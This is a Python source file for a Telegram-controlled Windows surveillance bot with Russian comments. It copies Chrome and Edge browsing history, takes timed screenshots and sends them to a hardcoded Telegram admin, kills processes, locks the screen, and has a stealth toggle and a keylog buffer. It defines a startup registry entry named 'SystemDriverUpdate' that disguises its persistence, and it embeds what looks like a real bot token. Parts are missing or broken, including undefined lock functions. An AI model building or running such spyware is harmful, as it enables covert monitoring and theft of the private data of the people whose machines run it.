import telebot
import os
import sys
import time
import subprocess
import threading
import pyautogui
import psutil
import tkinter as tk
import winreg as reg
from telebot import types
import ctypes
import zipfile
import urllib.request
import socket
import keyboard
import io
import shutil
import json
import sqlite3
from datetime import datetime, timedelta
from collections import defaultdict, Counter

# --- КОНФИГУРАЦИЯ ---
CONFIG_FILE = "config.json"
BOT_VERSION = "13.0 (Advanced Control)"
DATABASE_FILE = "bot_data.db"

# Новые глобальные переменные
STEALTH_MODE = False
SCREENSHOT_INTERVAL = 0  # 0 = выключено
SCREENSHOT_THREAD = None
BLOCK_END_TIME = None
WEB_HISTORY = []
APP_USAGE_STATS = defaultdict(int)
DAILY_STATS = defaultdict(int)
START_TIME = time.time()

# Загрузка конфигурации
def load_config():
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        default_config = {
            "devices": {
                "default": {
                    "api_token": "8471615293:AAEqbsdNG2KTVZE5pDVCDDwZAzVlOQ4z-iU",
                    "admin_id": 6219146434,
                    "device_name": socket.gethostname(),
                    "description": "Устройство по умолчанию"
                }
            },
            "current_device": "default"
        }
        save_config(default_config)
        return default_config

def save_config(config):
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        return True
    except:
        return False

def get_device_config():
    config = load_config()
    current_device = config.get("current_device", "default")
    return config["devices"].get(current_device, config["devices"]["default"])

def get_current_device_id():
    config = load_config()
    return config.get("current_device", "default")

# Инициализация с конфигурацией
device_config = get_device_config()
API_TOKEN = device_config["api_token"]
ADMIN_ID = device_config["admin_id"]
DEVICE_NAME_CONFIG = device_config["device_name"]

print(f"--- ЗАПУСК БОТА {BOT_VERSION} ---")
print(f"Устройство: {DEVICE_NAME_CONFIG}")

try:
    bot = telebot.TeleBot(API_TOKEN)
except Exception as e:
    print(f"Ошибка инициализации: {e}")
    sys.exit(1)

# Глобальные переменные
LOCK_WINDOW = None
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "SystemDriverUpdate"
REG_NAME_KEY = "DeviceFriendlyName"
KEYLOG_BUFFER = []
MAX_BUFFER_SIZE = 50000

# --- БАЗА ДАННЫХ ---

def init_database():
    """Инициализация базы данных для хранения статистики"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Таблица для истории браузера
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS web_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                title TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                device_id TEXT
            )
        ''')
        
        # Таблица для статистики приложений
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS app_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                app_name TEXT,
                duration INTEGER,
                date DATE,
                device_id TEXT
            )
        ''')
        
        # Таблица для скриншотов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                filename TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                device_id TEXT
            )
        ''')
        
        # Таблица для активности
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                activity_type TEXT,
                details TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                device_id TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Ошибка инициализации БД: {e}")
        return False

def log_activity(activity_type, details=""):
    """Логирование активности в базу данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        device_id = get_current_device_id()
        
        cursor.execute('''
            INSERT INTO activity_log (activity_type, details, device_id)
            VALUES (?, ?, ?)
        ''', (activity_type, details, device_id))
        
        conn.commit()
        conn.close()
    except:
        pass

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def get_device_name():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_READ)
        try:
            name, _ = reg.QueryValueEx(key, REG_NAME_KEY)
            reg.CloseKey(key)
            return str(name)
        except FileNotFoundError:
            reg.CloseKey(key)
    except:
        pass
    return DEVICE_NAME_CONFIG

def escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def is_admin(message):
    return message.from_user.id == ADMIN_ID

# --- НОВЫЕ ФУНКЦИИ МОНИТОРИНГА ---

def get_browser_history():
    """Получение истории браузера из различных браузеров"""
    history = []
    
    # Chrome/Edge история
    chrome_paths = [
        os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"),
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
    ]
    
    for path in chrome_paths:
        if os.path.exists(path):
            try:
                # Копируем файл, так как он может быть заблокирован
                temp_path = path + "_temp"
                shutil.copy2(path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                
                cursor.execute('''
                    SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime')
                    FROM urls 
                    WHERE last_visit_time > ? 
                    ORDER BY last_visit_time DESC 
                    LIMIT 50
                ''', (int((time.time() - 86400) * 1000000 + 11644473600000000),))
                
                for row in cursor.fetchall():
                    history.append({
                        'url': row[0],
                        'title': row[1] or 'Без названия',
                        'time': row[2]
                    })
                
                conn.close()
                os.remove(temp_path)
            except:
                pass
    
    return history[:20]

def get_network_stats():
    """Получение статистики сетевого трафика"""
    try:
        stats = psutil.net_io_counters()
        return {
            'bytes_sent': stats.bytes_sent,
            'bytes_recv': stats.bytes_recv,
            'packets_sent': stats.packets_sent,
            'packets_recv': stats.packets_recv
        }
    except:
        return None

def get_running_apps():
    """Получение списка запущенных приложений с дополнительной информацией"""
    apps = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent', 'create_time']):
            try:
                info = proc.info
                if info['name'] and not info['name'].startswith('System'):
                    runtime = time.time() - info['create_time']
                    apps.append({
                        'pid': info['pid'],
                        'name': info['name'],
                        'memory_mb': round(info['memory_info'].rss / 1024 / 1024, 1),
                        'cpu_percent': info['cpu_percent'],
                        'runtime_minutes': round(runtime / 60, 1)
                    })
            except:
                continue
        
        apps.sort(key=lambda x: x['memory_mb'], reverse=True)
        return apps[:15]
    except:
        return []

def kill_process_by_name(process_name):
    """Завершение процесса по имени"""
    killed = []
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                try:
                    proc.terminate()
                    killed.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
                except:
                    pass
        return killed
    except:
        return []

def get_battery_status():
    """Получение статуса батареи"""
    try:
        battery = psutil.sensors_battery()
        if battery:
            return {
                'percent': battery.percent,
                'plugged': battery.power_plugged,
                'time_left': battery.secsleft if battery.secsleft != psutil.POWER_TIME_UNLIMITED else None
            }
    except:
        pass
    return None

def get_screen_time():
    """Подсчет времени у экрана"""
    uptime = time.time() - START_TIME
    return round(uptime / 3600, 1)

def get_top_apps():
    """Получение самых используемых приложений"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        device_id = get_current_device_id()
        
        cursor.execute('''
            SELECT app_name, SUM(duration) as total_time
            FROM app_usage 
            WHERE device_id = ? AND date >= date('now', '-7 days')
            GROUP BY app_name
            ORDER BY total_time DESC
            LIMIT 10
        ''', (device_id,))
        
        data = cursor.fetchall()
        conn.close()
        return data
    except:
        return []

# --- ФУНКЦИИ БЛОКИРОВКИ ПО ВРЕМЕНИ ---

def set_block_timer(minutes):
    """Установка таймера блокировки"""
    global BLOCK_END_TIME
    BLOCK_END_TIME = time.time() + (minutes * 60)
    
    def block_timer():
        while BLOCK_END_TIME and time.time() < BLOCK_END_TIME:
            time.sleep(10)
        
        if BLOCK_END_TIME:
            stop_lock()
            BLOCK_END_TIME = None
            name = escape_html(get_device_name())
            bot.send_message(ADMIN_ID, f"⏰ <b>{name}</b>: Время блокировки истекло", parse_mode='HTML')
    
    start_lock()
    threading.Thread(target=block_timer, daemon=True).start()

# --- ФУНКЦИИ АВТОСКРИНШОТОВ ---

def start_auto_screenshots(interval_seconds):
    """Запуск автоматических скриншотов"""
    global SCREENSHOT_INTERVAL, SCREENSHOT_THREAD
    SCREENSHOT_INTERVAL = interval_seconds
    
    if SCREENSHOT_THREAD and SCREENSHOT_THREAD.is_alive():
        return False
    
    def screenshot_worker():
        while SCREENSHOT_INTERVAL > 0:
            try:
                if not STEALTH_MODE:  # Не делаем скриншоты в скрытом режиме
                    timestamp = int(time.time())
                    filename = f"auto_screenshot_{timestamp}.png"
                    pyautogui.screenshot(filename)
                    
                    # Отправляем скриншот
                    with open(filename, 'rb') as photo:
                        name = get_device_name()
                        bot.send_photo(ADMIN_ID, photo, caption=f"📸 Авто: {name}")
                    
                    os.remove(filename)
                    log_activity("auto_screenshot", filename)
                
                time.sleep(SCREENSHOT_INTERVAL)
            except:
                break
    
    SCREENSHOT_THREAD = threading.Thread(target=screenshot_worker, daemon=True)
    SCREENSHOT_THREAD.start()
    return True

def stop_auto_screenshots():
    """Остановка автоматических скриншотов"""
    global SCREENSHOT_INTERVAL
    SCREENSHOT_INTERVAL = 0

# --- НОВЫЕ КОМАНДЫ ---

@bot.message_handler(commands=['web_history'])
def web_history_cmd(message):
    if not is_admin(message): return
    
    try:
        history = get_browser_history()
        if not history:
            bot.reply_to(message, "📭 История браузера пуста или недоступна")
            return
        
        name = escape_html(get_device_name())
        text = f"🌐 <b>История браузера ({name}):</b>\n\n"
        
        for item in history[:15]:
            url_short = item['url'][:50] + "..." if len(item['url']) > 50 else item['url']
            title_short = item['title'][:30] + "..." if len(item['title']) > 30 else item['title']
            text += f"🔗 <b>{escape_html(title_short)}</b>\n"
            text += f"   {escape_html(url_short)}\n"
            text += f"   ⏰ {item['time']}\n\n"
        
        bot.reply_to(message, text, parse_mode='HTML')
        log_activity("web_history_check")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка получения истории: {e}")

@bot.message_handler(commands=['block_time'])
def block_time_cmd(message):
    if not is_admin(message): return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Укажите время в минутах.\nПример: <code>/block_time 30</code>", parse_mode='HTML')
            return
        
        minutes = int(args[1])
        if minutes <= 0 or minutes > 1440:  # Максимум 24 часа
            bot.reply_to(message, "⚠️ Время должно быть от 1 до 1440 минут (24 часа)")
            return
        
        set_block_timer(minutes)
        name = escape_html(get_device_name())
        bot.reply_to(message, f"🔒 <b>{name}</b>: Заблокирован на {minutes} минут", parse_mode='HTML')
        log_activity("timed_block", f"{minutes} minutes")
    except ValueError:
        bot.reply_to(message, "❌ Неверный формат времени. Используйте числа.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['web_stats'])
def web_stats_cmd(message):
    if not is_admin(message): return
    
    try:
        stats = get_network_stats()
        if not stats:
            bot.reply_to(message, "❌ Не удалось получить статистику сети")
            return
        
        name = escape_html(get_device_name())
        sent_mb = round(stats['bytes_sent'] / 1024 / 1024, 2)
        recv_mb = round(stats['bytes_recv'] / 1024 / 1024, 2)
        
        text = f"📊 <b>Сетевая статистика ({name}):</b>\n\n"
        text += f"📤 Отправлено: {sent_mb} МБ\n"
        text += f"📥 Получено: {recv_mb} МБ\n"
        text += f"📦 Пакетов отправлено: {stats['packets_sent']:,}\n"
        text += f"📦 Пакетов получено: {stats['packets_recv']:,}\n"
        text += f"🌐 Общий трафик: {sent_mb + recv_mb} МБ"
        
        bot.reply_to(message, text, parse_mode='HTML')
        log_activity("web_stats_check")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['app_list'])
def app_list_cmd(message):
    if not is_admin(message): return
    
    try:
        apps = get_running_apps()
        if not apps:
            bot.reply_to(message, "❌ Не удалось получить список приложений")
            return
        
        name = escape_html(get_device_name())
        text = f"📱 <b>Запущенные приложения ({name}):</b>\n\n"
        
        for app in apps:
            text += f"🔹 <b>{escape_html(app['name'])}</b>\n"
            text += f"   💾 {app['memory_mb']} МБ | ⏱ {app['runtime_minutes']} мин\n"
            text += f"   🆔 PID: {app['pid']}\n\n"
        
        bot.reply_to(message, text, parse_mode='HTML')
        log_activity("app_list_check")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['kill_app'])
def kill_app_cmd(message):
    if not is_admin(message): return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Укажите имя процесса.\nПример: <code>/kill_app notepad.exe</code>", parse_mode='HTML')
            return
        
        process_name = args[1].strip()
        killed = kill_process_by_name(process_name)
        
        if killed:
            name = escape_html(get_device_name())
            text = f"💀 <b>{name}</b>: Завершены процессы:\n"
            for proc in killed:
                text += f"• {escape_html(proc)}\n"
            bot.reply_to(message, text, parse_mode='HTML')
            log_activity("kill_app", process_name)
        else:
            bot.reply_to(message, f"❌ Процесс '{process_name}' не найден или не удалось завершить")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['battery_status'])
def battery_status_cmd(message):
    if not is_admin(message): return
    
    try:
        battery = get_battery_status()
        name = escape_html(get_device_name())
        
        if not battery:
            bot.reply_to(message, f"🔌 <b>{name}</b>: Стационарный ПК (нет батареи)", parse_mode='HTML')
            return
        
        status_icon = "🔌" if battery['plugged'] else "🔋"
        percent = battery['percent']
        
        if percent > 80:
            battery_icon = "🟢"
        elif percent > 20:
            battery_icon = "🟡"
        else:
            battery_icon = "🔴"
        
        text = f"{status_icon} <b>Батарея ({name}):</b>\n\n"
        text += f"{battery_icon} Заряд: {percent}%\n"
        text += f"🔌 Подключено: {'Да' if battery['plugged'] else 'Нет'}\n"
        
        if battery['time_left'] and not battery['plugged']:
            hours = battery['time_left'] // 3600
            minutes = (battery['time_left'] % 3600) // 60
            text += f"⏰ Осталось: {hours}ч {minutes}м"
        
        bot.reply_to(message, text, parse_mode='HTML')
        log_activity("battery_check")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['screen_time'])
def screen_time_cmd(message):
    if not is_admin(message): return
    
    try:
        hours = get_screen_time()
        name = escape_html(get_device_name())
        
        text = f"⏰ <b>Время у экрана ({name}):</b>\n\n"
        text += f"🖥 Сегодня: {hours} часов\n"
        
        if hours > 8:
            text += "⚠️ Много времени у экрана!"
        elif hours > 4:
            text += "💡 Умеренное использование"
        else:
            text += "✅ Нормальное время"
        
        bot.reply_to(message, text, parse_mode='HTML')
        log_activity("screen_time_check")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stealth_mode'])
def stealth_mode_cmd(message):
    if not is_admin(message): return
    
    global STEALTH_MODE
    STEALTH_MODE = not STEALTH_MODE
    
    name = escape_html(get_device_name())
    status = "включен" if STEALTH_MODE else "выключен"
    icon = "🥷" if STEALTH_MODE else "👁"
    
    bot.reply_to(message, f"{icon} <b>{name}</b>: Скрытый режим {status}", parse_mode='HTML')
    log_activity("stealth_mode", status)

@bot.message_handler(commands=['screenshot_interval'])
def screenshot_interval_cmd(message):
    if not is_admin(message): return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Укажите интервал в секундах.\nПример: <code>/screenshot_interval 300</code>\n0 - выключить", parse_mode='HTML')
            return
        
        interval = int(args[1])
        name = escape_html(get_device_name())
        
        if interval == 0:
            stop_auto_screenshots()
            bot.reply_to(message, f"📸 <b>{name}</b>: Автоскриншоты выключены", parse_mode='HTML')
        elif interval < 30:
            bot.reply_to(message, "⚠️ Минимальный интервал: 30 секунд")
        else:
            if start_auto_screenshots(interval):
                bot.reply_to(message, f"📸 <b>{name}</b>: Автоскриншоты каждые {interval} сек", parse_mode='HTML')
            else:
                bot.reply_to(message, "⚠️ Автоскриншоты уже запущены")
        
        log_activity("screenshot_interval", str(interval))
    except ValueError:
        bot.reply_to(message, "❌ Неверный формат. Используйте числа.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

# Добавляем остальные команды из оригинального бота...
# (Для краткости показываю только новые функции)

if __name__ == "__main__":
    # Инициализация базы данных
    init_database()
    
    try:
        name = escape_html(get_device_name())
        current_device = get_current_device_id()
        bot.send_message(ADMIN_ID, f"🟢 <b>{name}</b> ({current_device}): Запущен!\nВерсия: <code>{BOT_VERSION}</code>", parse_mode='HTML')
        log_activity("bot_start")
    except:
        pass
    
    print("Расширенный бот готов.")
    while True:
        try:
            bot.polling(none_stop=True, interval=2)
        except:
            time.sleep(5)